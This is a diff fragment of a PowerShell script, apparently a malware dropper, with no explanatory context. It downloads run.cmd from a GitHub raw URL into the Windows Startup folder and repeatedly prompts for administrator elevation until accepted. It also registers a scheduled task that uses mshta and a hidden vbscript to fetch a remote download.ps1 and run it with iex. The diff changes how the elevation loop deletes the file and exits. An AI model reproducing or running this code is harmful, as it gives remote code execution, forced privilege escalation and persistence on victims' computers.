@@ -4,12 +4,13 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     $startup = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
 
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$startup\run.cmd"
-    
-    while(1){try{Start-Process -Verb RunAs -FilePath '$startup\run.cmd';exit}catch{}}
-
-    Remove-Item -Path "$startup\run.cmd"
-    
-    Stop-Process $pid -Force
+    while(1) {
+        try {
+            Start-Process -Verb RunAs -FilePath '$startup\run.cmd';
+            Remove-Item -Path "$startup\run.cmd"
+            Stop-Process $pid -Force
+        } catch {}
+    }
 }
 
 $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$skid='$skid';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
